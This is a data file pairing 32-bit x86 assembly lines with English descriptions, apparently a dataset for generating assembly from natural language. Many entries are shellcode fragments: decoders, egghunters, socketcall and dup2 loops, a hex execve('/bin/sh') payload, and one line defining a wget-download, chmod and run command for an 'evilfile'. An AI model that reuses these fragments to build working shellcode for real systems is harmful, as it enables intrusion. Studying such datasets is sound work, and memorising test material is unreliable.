SNIPPETS	INTENTS
int 0x80	make the system call to the kernel
int 0x80	system call interrupt
int 0x80	system call interrupt 0x80
int 80h	call sys_read
int 80h	call sys_read to fill the buffer
int 80h	call sys_write
int 80h	call the kernel
int 80h	make kernel call to display line string
int 80h	make kernel call to exit program
int 80h	make sys_exit kernel call
int 80h	make sys_write kernel call
int 80h	make syscall to output the text to stdout
int 80h	make syscall to terminate the program
int 80h	make the syscall to terminate the program
int 80h	make the system calls to the kernel
ja exi	jump to exi if greater
ja exit	jump to the exit label if the destination operand is greater than the source operand in the above comparison
ja next	jump to next label if the destination is greater than the source in the above comparison
ja write	jump to write if greater
jb 0xf3	perform an unsigned comparison and jump to 0xf3 if lower
jb modtest	jump to label modtest if below
jb next	jump to label next if below
jb write	jump to label write if below
jbe done	jump to label done if below or equal
je all	jump to the all label if the operands of the above comparison are equals
je connec	jump to connect if equal
je connect	jump to the connect label if the operands of the above comparison are equals
je continue	if equal jump to label continue
je continue	jump to label continue if equal
je done	jump to label done if equal
je even_number	jump to even_numer if greater
je exit	jump to label exit if equal to 0
je exit	jump to the exit label if the operands of the above comparison are equals
je l7	if equal then jump to label l7
je short encodedshellcode	jump short to encodedshellcode if equal
je short loc_402b13	jump to loc_402b13 if equal
je stop	jump to label stop if equal
jeq loop	jump to the code location labeled loop if the operands of the previous comparison are equal
jg finished	jump if greater than to label finished
jl _while_loop	jump to the _while_loop if lower
jl _while_loop	jump to the _while_loop label if the destination operand is less than the source operand in the above comparison
jl finished	jump if less than to label finished
jl wrap_around	jump to the wrap_around label if the destination operand is less than the source operand in the above comparison
jle lp1	if it is less than or equal to 10 then jump to lp1
jmp _accept	jump to label _accept
jmp _read	jump to _read
jmp _return	jump to the _return label
jmp _star	jump to _star
jmp _start	jump to the _start label
jmp _while_loop	jump to the _while_loop label
jmp aslr_file	jump to the aslr_file label
jmp begin	jump to the instruction labeled begin
jmp call_egghunter	jump to the call_egghunter label
jmp callpop	jump to callpop
jmp callpop	jump to the callpop label
jmp callz	jump to the callz label
jmp carryon	jump to the carryon label
jmp connec	jump to connec
jmp data	jump to the data label
jmp eax	jump to eax
jmp eax	jump to the value stored in the eax register
jmp ecx	jump to ecx
jmp edi	jump to edi
jmp edi	jump to the edi label
jmp edx	jump to edx
jmp encrypt	jump to the encrypt label
jmp entrypoint	jump to the entrypoint label
jmp esp	jump to the esp label
jmp fupdisasm+1	jump to fupdisasm+1
jmp fupdisasm+1	jump to the address specified by the operation fupdisasm+1
jmp fupdisasm+3	jump to the address specified by the operation fupdisasm+3
jmp jocker	jump to the jocker label
jmp l20	jump to label l20
jmp loop	jump to the label loop
jmp multiplyloop	jump to label multiplyloop
jmp nextarg	jump to nextarg label
jmp nextchar	jump to the point in the code labeled nextchar
jmp one	jump to the one label
jmp read	jump to label read
jmp read	jump to the label read
jmp read	jump to the read label
jmp reading	jump to the reading label
jmp shell	jump to the shell label
jmp shellcode	jump to shellcode
jmp shellcode	jump to the shellcode label
jmp short _cmd	jump short to the _cmd label
jmp short _execline	jump short to the _execline label
jmp short _file	jump short to the _file label
jmp short _load_data	jump short to _load_data label
jmp short _load_data	jump short to the _load_data label
jmp short _star	jump short to _star label
jmp short _start	jump short to the _start label
jmp short .exit	jump short to the .exit label
jmp short 0x11	jump short to 0x11
jmp short 0x2c	jump short to 0x2c
jmp short 0x34	jump short to 0x34
jmp short 0x63	jump short to 0x63
jmp short call_decoder	jump short to call_decoder
jmp short call_decoder	jump short to the call_decoder label
jmp short call_shellcode	jump short to call_shellcode
jmp short call_shellcode	jump short to the call_shellcode label
jmp short call_write	jump short to the call_write label
jmp short callit	jump short to the callit label
jmp short callme	jump short to the callme label
jmp short cmd	jump short to the cmd label
jmp short cycle	jump short to cycle label
jmp short cycle	jump short to the cycle label
jmp short decode	jump short to decode
jmp short decode	jump short to the decode label
jmp short decode_pr	jump short to the decode_pr label
jmp short enc	jump short to the enc label
jmp short end	jump short to the end label
jmp short exi	jump short to exi label
jmp short fileaddress	jump short to the fileaddress label
jmp short formatting	jump short to the formatting label
jmp short four	jump short to the four label
jmp short get	jump short to the get label
jmp short gotocall	jump short to the gotocall label
jmp short here	jump short to the here label
jmp short inc_dec	jump short to inc_dec
jmp short main	jump short to the main label
jmp short output	jump short to the output label
jmp short path	jump short to the path label
jmp short process_shellcode	jump short to the process_shellcode label
jmp short push_cmd	jump short to push_cmd
jmp short push_cmd	jump short to the push_cmd label
jmp short read	jump short to the read label
jmp short rotate	jump short to the rotate label
jmp short search	jump short to the search label
jmp short setup	jump short to the setup label
jmp short shellcode	jump short to shellcode
jmp short shellcode	jump short to the shellcode label
jmp short stage	jump short to stage
jmp short stage	jump short to the stage label
jmp short three	jump short to the three label
jmp short todo	jump short to the todo label
jmp short two	jump short to the two label
jmp two	jump to the two label
jmp two	jump to two
jmp_search:	define the jmp_search label
jnc 0x86	jump to 0x86 if the carry flag is zero
jnc 0xd8	jump to 0xd8 it the carry flag is zero
jne _nex	if not equal jump to the _nex label
jne _next	jump to the _next label if the operands of the above comparison are not equals
jne 804809a	jump to 804809a if not equal
jne 80480aa	jump to 80480aa if not equal
jne checkbuzz	if the remainder is not equal to zero jump to local label checkbuzz
jne checkint	if the remainder is not equal to zero jump to local label checkint
jne loop	jump to the address specified by the label loop if the operands are not equals in the previous comparison
jne next_addr	jump to the next_addr label if the operands of the above comparison are not equals
jne nextnumber	if not equal jump to the label nextnumber
jne no_error	jump to the label no_error if not equal
jne retry	jump to retry if not equal
jne short _while_loop	if not equal jump short to the _while_loop
jne short _while_loop	jump to the _while_loop label if the operands of the above comparison are not equals
jns _dup2_loop	jump to the _dup2_loop label if the previous instruction clears the sign flag
jns 2f	jump to 2f if the sign flag is zero
jns 3f	jump to 3f if the sign flag is zero
jns decode_pr	jump to decode_pr if not signed
jns dup2	jump to dup2 if not negative
jns dup2	jump to the dup2 label if the previous instruction clears the sign flag
jns duploop	jump to duploop if not negative
jns duploop	jump to the duploop label if the previous instruction clears the sign flag
jns loop	jump to the loop label if the previous instruction clears the sign flag
jns loopinghere	jump to the loopinghere label if the previous instruction clears the sign flag
jnz _start	jump to the _start label if the zero flag is cleared
jnz 0x41	jump to 0x41 if not zero
jnz 0x8	jump to 0x8 if not zero
jnz 1	if not zero jump to numeric label 1
jnz 1	jump to the numeric label 1 if the zero flag is cleared
jnz decode	jump to the decode label if the zero flag is cleared
jnz exeunt	jump to exeunt if not zero
jnz exit_on_error	jump to the exit_on_error label if the zero flag is cleared
jnz incaddr	increment address if no match
jnz incaddr	jump to incaddr if no match
jnz l00p	jump to the l00p label if the zero flag is cleared
jnz loop	jump to loop if not equal to zero
jnz loop	jump to the loop label if the zero flag is cleared
jnz next_addr	jump to next_addr if not zero
jnz next_cycle	if not zero jump to the next_cycle label
jnz next_cycle	jump to the next_cycle label if the zero flag is cleared
jnz scan	if not 0 then jump to the scan label
jnz short _paren	if not zero jump short to the _paren label
jnz short _parent	jump short to the _parent label if the zero flag is cleared
jnz short decode	jump short to decode if not zero
jnz short decode	jump short to the decode label if the zero flag is cleared
jnz short loc_4010e5	if not zero jump to loc_4010e5
jnz stage	jump to the stage label if the zero flag is cleared
jnz top	if not 0 then jump to the top label
jocker:	declare the jocker label
js error	jump to error label if sign flag SF is equal to 1
jz _close	jump to the label _close if the zero flag is set
jz _read	jump to the label _read if the zero flag is set
jz _start	jump to the _start label if the zero flag is set
jz 0x8	jump to 0x8 if zero
jz call_decoded	jump to the call_decoded label if the zero flag is set
jz child	if zero jump to the child label
jz child	jump to child if zero
jz child	jump to label child if the zero flag is set
jz child	jump to the child label if the zero flag is set
jz decoded_shellcode	jump to decoded if zero
jz download	jump to download if zero
jz download	jump to the download label if the zero flag is set
jz encoded	if zero jump to the encoded label
jz encoded	jump to the encoded label if the zero flag is set
jz exit	jump to the exit label if the zero flag is set
jz find_egg	jump to find_egg if zero
jz find_egg	jump to the find_egg label if the zero flag is set
jz finished	jump to the point in the code labeled finished if zero
jz formatting	if zero jump to the formatting label
jz formatting	jump to the formatting label if the zero flag is set
jz incpage	jump to incpage if equal
jz next_cycle	if zero jump to the next_cycle label
jz next_cycle	jump to the next_cycle label if the zero flag is set
jz next_page	jump to next_page if zero
jz nomoreargs	if zero flag is set jump to nomoreargs label
jz shift_decode	if zero jump to the shift_decode label
jz shift_decode	jump to the shift_decode label if the zero flag is set
jz short loc_402b13	if 0 then jump to loc_402b13
key equ 0xdeadbeef	define key constant equal to 0xdeadbeef
l00p:	declare the l00p label
lea bx, [bp+0x08]	load the effective address of the operation [bp+0x08] into the bx register
lea bx, [bp+0x0b]	load the effective address of the operation bp+0x0b] into the bx register
lea cx, [bp+di+0x32]	load the effective address of the operation [bp+di+0x32] into the cx register
lea dx, [bp+di+0x3e]	load the effective address of the operation [bp+di+0x3e] into the dx register
lea eax, [ebx+0xf]	load the effective address of the result of the operation [ebx+0xf] into the eax register
lea eax, [ebx+17h]	load the effective address of the result of the operation [ebx+17h] into the eax register
lea eax, [ebx+8]	put the address of ebx+8 into eax
lea eax, [ecx+0bh]	load the effective address of the result of the operation [ecx+0bh] into the eax register
lea eax, [ecx+4]	load the effective address of the result of the operation [ecx+4] into the eax register
lea eax, [val]	place the value val in eax
lea eax, [var]	place the address of var in eax
lea eax, [var]	place the value in var in eax
lea eax, [zero_reg+3]	load the effective address [zero_reg+3] into eax
lea eax, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the eax register
lea eax, [zero_reg+6]	load the effective address [zero_reg+6] into eax
lea eax, [zero_reg+6]	load the effective address of the result of the operation [zero_reg+6] into the eax register
lea eax, [zero_reg+66h]	load the effective address [zero_reg+66h] into eax
lea eax, [zero_reg+66h]	load the effective address of the result of the operation [zero_reg+66h] into the eax register
lea eax,[ebx+0xb]	load the effective address of the operation [ebx+0xb] into the eax register
lea ebp,[ebp+0x59]	load the effective address of the operation [ebp+0x59] into the ebp register
lea ebx, [ebp-8]	load the effective address [ebp-8] into ebx
lea ebx, [ebp-8]	load the effective address of ebp-8 into the ebx register
lea ebx, [ebp+24]	load the effective address [ebp+24] into ebx
lea ebx, [ebp+24]	load the effective address of the result of the operation [ebp+24] into the ebx register
lea ebx, [ebp+39]	load the effective address [ebp+39] into ebx
lea ebx, [ebp+39]	load the effective address of the result of the operation [ebp+39] into the ebx register
lea ebx, [edx+0x4]	load the effective address of edx+0x4 into ebx
lea ebx, [esi]	load the effective address of esi into the ebx register
lea ebx, [esi+13]	load the effective address of the result of the operation [esi+13] into the ebx register
lea ebx, [esi+14]	load the effective address of the result of the operation [esi+14] into the ebx register
lea ebx, [esi+15]	load the effective address [esi+15] into ebx
lea ebx, [esi+15]	load the effective address of the result of the operation [esi+15] into the ebx register
lea ebx, [esi+23]	load the effective address of the result of the operation [esi+23] into the ebx register
lea ebx, [esp +1]	load the effective address [esp+1] into ebx
lea ebx, [esp +1]	load the effective address of the result of the operation [esp +1] into the ebx register
lea ebx, [esp]	load the effective address of esp into ebx
lea ebx, [esp]	load the effective address of esp into the ebx register
lea ebx, [zero_reg+3]	load the effective address [zero_reg+3] into ebx
lea ebx, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the ebx register
lea ecx, [eax]	load the effective address of the result of the operation [eax] into the ecx register
lea ecx, [ebp+28]	load the effective address [ebp+28] into ecx
lea ecx, [ebp+28]	load the effective address of the result of the operation [ebp+28] into the ecx register
lea ecx, [ebx+0xff]	load the value of ebx+0xff into register ecx
lea ecx, [ebx+8]	load the effective address of ebx+8 into ecx
lea ecx, [esi + 8]	load the effective address of the result of the operation [esi + 8] into the ecx register
lea ecx, [esi+18]	load the effective address [esi+18] into ecx
lea ecx, [esi+18]	load the effective address of the result of the operation [esi+18] into the ecx register
lea ecx, [esi+22]	load the effective address of the result of the operation [esi+22] into the ecx register
lea ecx, [esi+35]	load the effective address of the result of the operation [esi+35] into the ecx register
lea ecx, [esi+8]	load the effective address of the result of the operation [esi+8] into the ecx register
lea ecx, [esp]	load the effective address of esp into the ecx register
lea ecx, [zero_reg+117]	load the effective address [zero_reg+117] into ecx
lea ecx, [zero_reg+117]	load the effective address of the result of the operation [zero_reg+117] into the ecx register
lea ecx, [zero_reg+3]	load the effective address [zero_reg+3] into ecx
lea ecx, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the ecx register
lea edi, [ebx]	load the effective address [ebx] into edi
lea edi, [ebx]	load the effective address of ebx into the edi register
lea edi, [ebx+4*esi]	place the quantity ebx+4*esi in edi
lea edi, [ebx+4*esi]	place the value ebx+4*esi in edi
lea edi, [esi + 13]	load the effective address of the result of the operation [esi + 13] into the edi register
lea edi, [esi +1]	load the effective address of [esi + 1] into the edi register
lea edi, [esi]	load the effective address [esi] into edi
lea edi, [esi+13]	load the effective address of esi+13 into esi+13
lea edx, [ebx+12]	load the effective address of ebx+12 into edx
lea edx, [esi + 12]	load the effective address of the result of the operation [esi + 12] into the edx register
lea edx, [esi+26]	load the effective address [esi+26] into edx
lea edx, [esi+26]	load the effective address of the result of the operation [esi+26] into the edx register
lea edx, [esi+30]	load the effective address of the result of the operation [esi+30] into the edx register
lea edx, [esi+47]	load the effective address of the result of the operation [esi+47] into the edx register
lea esi, [ebp+20]	load the effective address [ebp+20] into esi
lea esi, [ebp+20]	load the effective address of the result of the operation [ebp+20] into the esi register
lea esi, [esi +4]	load the effective address of the result of the operation [esi +4] into the esi register
lea esi, [esi+4]	load the effective address [esi+4] into esi
lea esp, [ebx]	load the value of register ebx into register esp
len equ $ - msg	define len equal to the length of msg
len equ $-encodedshellcode	define len equal to the lenght of the encodedshellcode array
len: equ $-google	declare the len label equal to the size of the google variable
len: equ $-shellcode	declare the len label equal to the length of shellcode
letter_c db 'c'	allocate a single byte of memory and initialize it to the letter 'c'
line db '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a	define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a
loader:	declare the loader label
loop .3	decrement the counter and jump to .3 label if the count is not zero
loop 3	decrement ecx and jumps to the 3 label unless decrementing ecx caused its value to become zero
loop bucle	decrement the ecx register and jump to the bucle label if the counter is not zero
loop check_even_odd	decrement the count register and jump to check_even_odd if the count is not equal to zero
loop check_even_odd \n jmp short shellcode	decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label
loop decode	decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero
loop decode	decrement the count register and jump to decode if not equal zero
loop decode \n jmp edx	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register
loop decode \n jmp EncodedShellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the EncodedShellcode label
loop decode \n jmp Shellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label
loop decode \n jmp short shellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label
loop decrypt	decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero
loop decrypt \n jmp encrypt	decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label
loop do_dup	decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero
loop do_dup	decrement the counter and jump to the do_dup label if the count is not zero
loop do_dup \n push byte 0x3f	decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack
loop eggLoop \n jmp edi	decrement the ecx register and jump to the eggLoop label if the contents of the ecx register is not zero else jump to the edi register
loop fill	decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero
loop fill	decrement the counter and jump to the fill label if the count is not zero
loop fill \n mov ecx, esp	decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
loop l1 \n mov eax, esp	decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register
loop l1 \n mov eax, esp	decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register
loop l2 \n jmp edi	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else jump to the edi register
loop l2 \n mov ebx, esp	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
loop l2 \n mov ebx, esp	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else point the ebx register to the stack register
loop l3 \n mov ecx, esp	decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
loop l3 \n mov ecx, esp	decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register
loop l4 \n mov edx, esp	decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else move the contents of the esp register into the edx register
loop l4 \n mov edx, esp	decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register
loop main_inc	decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero
loop main_inc \n mov ebx, esp	decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
loop main_inc \n mov ebx, esp	decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register
loop main_loop	decrement the counter and jump to the main_loop label if the count is not zero
loop main_push	decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero
loop main_push \n mov cl, 30	decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register
loop ROT_decode \n jmp short Shellcode	decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label
loop up	decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero
loop:	declare the loop label
loop:	define the loop label
loopinghere:	declare the loopinghere label
loopnz decode	decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero
loopnz L1	decrement the counter and jump to the L1 label if the count is not zero and the zero flag is equal to zero
loopnz L1 \n jmp shellcode	decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label
loopnz L2	decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero
loopnz L2 \n push eax	decrement the ecx register and jump to the L2 label if the contents of the ecx register is not zero and the zero flag is zero else push the contents of the eax register onto the stack
loopnz L3 \n mov edx, 7	decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register
loopnz Label1	decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero
loopnz next	decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero
loopnz next \n jmp ecx	decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register
loopnz next2 \n jmp edi	decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register
main_inc:	create label main_inc
main_inc:	declare the main_inc label
main_loop:	define main_loop label
main_push:	create label main_push
main_push:	declare the main_push label
main:	create main label
main:	declare the main label
main:	define main label
marks dw 0, 0, 0, 0	allocate memory for the marks array of words and initialize all elements to zero
matrix qw 12*10	allocate memory for a 12*10 quad-bytes matrix
me:	declare the me label
me:	define me label
message db '/bin/sh'	define message byte and initialize it to '/bin/sh'
message db 'hello',13,0	allocate memory for a null terminated string 'hello\n'
message db '/bin/sh'	define message as the byte string '/bin/sh'
message db '/etc/passwd'	define message as the byte string '/etc/passwd'
message db '/etc/passwd'	define the string message and initialize it to '/etc/passwd'
message: db 'hello world!'	declare message to contain the bytes 'hello world!'
message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68	define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
mov [1000h], ax	move the value of ax into memory at address 1000h
mov [bp+0x07], al	move the contents of the al register at the memory location specified by the operation [bp+0x07]
mov [bp+0x0a], al	move the contents of the al register at the memory location specified by the operation [bp+0x0a]
mov [bp+0x31], al	move the contents of the al register at the memory location specified by the operation [bp+0x31]]
mov [bp+0x32], si	move the contents of the si register at the memory location specified by the operation [bp+0x32]
mov [bp+0x36], bx	move the contents of the bx register at the memory location specified by the operation [bp+0x36]
mov [bp+0x3a], bx	move the contents of the bx register at the memory location specified by the operation [bp+0x3a]
mov [bp+0x3e], ax	move the contents of the ax register at the memory location specified by the operation [bp+0x3e]
mov [ebp-4], edi	move edi into the local memory address ebp-4
mov [ebp+12], ecx	move ecx into the address [ebp+12]
mov [ebp+12], ecx	move the contents of ecx into the memory location specified by the operation [ebp+12]
mov [ebp+20], zero_reg	move the contents of zero_reg into the memory location specified by the operation [ebp+20]
mov [ebp+20], zero_reg	move zero_reg into the address [ebp+20]
mov [ebp+22], word ax	move the word at the address ax into [ebp+22]
mov [ebp+22], word ax	move the word in ax into the memory location specified by the operation [ebp+22]
mov [ebp+var_a], eax	move the contents of eax into address defined by ebp+var_a
mov [ebx + 6], dl	move dl into the address [ebx + 6]
mov [ebx], 110	move 110 into the effective address saved in ebx
mov [ebx], 123	move 123 into the effective address saved in ebx
mov [ebx+0xe], dl	move dl into the address [ebx+0xe]
mov [ebx+12], eax	move eax into ebx+12
mov [ebx+7], al	move al into ebx+7
mov [ebx+8], ebx	move ebx into ebx+8
mov [ecx], 25	move 25 decimal into the memory address ecx
mov [ecx+4], eax	move eax into the address [ecx+4]
mov [edi], al	move al into edi
mov [edi], al	move the contents of the al register into the edi register
mov [esi], al	move the contents of the al register into the esi register
mov [esi+13], al	move al into the address [esi+13]
mov [esi+22], al	move al into the address [esi+22]
mov [esi+34], al	move al into the address [esi+34]
mov [esi+35], esi	move esi into the address [esi+35]
mov [esi+39], ebx	move ebx into the address [esi+39]
mov [esi+43], ebx	move ebx into the address [esi+43]
mov [esi+47], eax	move eax into the address [esi+47]
mov [esi+eax], cl	move the contents of cl into the byte at memory address esi+eax
mov [esp + 1], cl	move cl into the address [esp + 1]
mov [esp+4], esp	move esp into the address [esp+4]
mov [esp+57], al	move al into the address [esp+57]
mov [esp+58], ah	move ah into the address [esp+58]
mov [esp+59], ebx	move ebx into the address [esp+59]
mov [var], ebx	move the contents of ebx into the 4 bytes at memory address var
mov [var1], eax	move the contents of eax into the 4 bytes at memory address var1
mov a_letter, al	move al into memory address a_letter
mov ah, 0x80	move 0x80 into ah
mov al, [byte_tbl+2]	move the effective address of byte_tbl+2 to al register
mov al, [esi]	move the contents of the esi register into the al register
mov al, 03h	move 03h into al
mov al, 04h	move 04h into al
mov al, 05h	move 05h into al
mov al, 0x01	move 0x01 into al
mov al, 0x01	move 0x1 into lower byte of the eax register
mov al, 0x04	move 0x04 into al
mov al, 0x05	put the syscall 0x5 into the al register
mov al, 0x06	move 0x06 into al
mov al, 0x0a	move 0x0a into al
mov al, 0x0b	move 0x0b into al
mov al, 0x1	move 0x1 into lower byte of the eax register
mov al, 0x1	move the value 0x1 into the al register
mov al, 0x17	move 0x17 into al
mov al, 0x1f	move 0x1f into al
mov al, 0x2	put the syscall 0x2 into the al register
mov al, 0x21	move 0x21 into al
mov al, 0x2e	move 0x2e into al
mov al, 0x3	move 0x3 into al
mov al, 0x30	move 0x30 into al
mov al, 0x33	move 0x33 into al
mov al, 0x3f	move 0x3f into al
mov al, 0x3f	syscall 63
mov al, 0x4	move 0x4 into al
mov al, 0x4	move the value 0x4 into the al register
mov al, 0x42	move 0x42 into al
mov al, 0x46	move 0x46 into al
mov al, 0x5	move 0x5 into al
mov al, 0x5	move the value 0x5 into the al register
mov al, 0x58	load the syscall value 0x58 for reboot in the al register
mov al, 0x6	move 0x6 into al
mov al, 0x66	make the socketcall
mov al, 0x66	make the systemcall socketcall
mov al, 0x66	move 0x66 into al
mov al, 0x66	syscall 102
mov al, 0x66	system call socketcall
mov al, 0x7	move 0x7 into al
mov al, 0x8	put the syscall 0x8 into the al register
mov al, 0xa2	move 0xa2 into al
mov al, 0xb	execve system call number 11
mov al, 0xb	mov 0xb into lower byte of eax
mov al, 0xb	move 0xb into al
mov al, 0xb5	move 0xb5 into al
mov al, 0xcd	move 0xcd into al
mov al, 0xf	move 0xf into al
mov al, 1	move 1 into al
mov al, 1	move the value 1 into the al register
mov al, 10	transfer the value 10 to the al register
mov al, 102	move 102 into al
mov al, 11	move the value 11 into the al register
mov al, 11	put the syscall 11 into the al register
mov al, 12	move 12 into al
mov al, 15	move 15 into lower byte of the eax register
mov al, 16	move 16 into al
mov al, 2	move 2 into al
mov al, 20	move 20 into al
mov al, 23	move 23 into al
mov al, 37	move 37 into al
mov al, 39	move 39 into al
mov al, 4	move 4 into al
mov al, 4	store 4 into al
mov al, 5	move 5 into al
mov al, 5 \n dec al \n jnz l2	move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero
mov al, 54	move 54 into al
mov al, 6	move 6 into al
mov al, 61	move 61 into al
mov al, 63	save 63 into al
mov al, 66h	move 66h into al
mov al, 70	move 70 into al
mov al, 72h	move 72h into al
mov al, 99	move 99 into al
mov al, a_letter	move data at memory location a_letter into al
mov al, byte [digits+eax]	move the effective address of digits+eax into al
mov al, byte [edi]	move the byte in edi into the al register
mov al, byte [edx+ecx]	move the effective address edx+ecx into al
mov al, byte [esi]	move the byte at the address [esi] into al
mov al, byte [esi]	move the byte in esi into al
mov al, byte [esi+1+ebp]	move the byte at the memory location specified by the operation [esi+1+ebp] into al
mov al, byte [esi+ecx]	move a byte from the address esi+ecx into al
mov al, byte 0bh	move the byte 0bh into al
mov al, byte 0bh	move the byte at the address 0bh into al
mov al, byte 0x1	move the byte at the address 0x1 into al
mov al, byte 2ah	move the byte 2ah into al
mov al, byte 2ah	move the byte at the address 2ah into al
mov al, byte 2h	move the byte 2h into al
mov al, byte 2h	move the byte at the address 2h into al
mov al, byte 3fh	move the byte 3fh into al
mov al, byte 3fh	move the byte at the address 3fh into al
mov al, byte 3h	move the byte 3h into al
mov al, byte 3h	move the byte at the address 3h into al
mov al, byte 66h	move the byte 66h into al
mov al, byte 66h	move the byte at the address 66h into al
mov al, byte 6h	move the byte 6h into al
mov al, byte 6h	move the byte at the address 6h into al
mov al, byte[buff+ecx]	move a byte from the address buff+ecx into al
mov al, cl	move cl into al
mov al, close_syscall	move close_syscall into al
mov al, dl	move dl into al
mov al, exit_call	move exit_call into al
mov al, write_syscall	move write_syscall into al
mov ax, [1000h]	load the object at the address 1000h into the ax register
mov ax, [di]	copy thevalue at memory address specified by di into ax
mov ax, [esi]	move esi into ex
mov ax, [esi]	move the contents of the esi register into the ax register
mov ax, [my_var]	copy my_var contents in ax
mov ax, 00	initialize ax to 00
mov ax, 010ch	move value of 0x010ch into the register ax
mov ax, 0x167	move 0x167 into ax
mov ax, 0x169	move 0x169 into ax
mov ax, 0x16a	move 0x16a into ax
mov ax, 0x16b	move 0x16b into ax
mov ax, 0x16c	move 0x16c into ax
mov ax, 1	move value of 1 into register ax
mov ax, 102	move 102 into ax
mov ax, 1666	move 1666 into ax
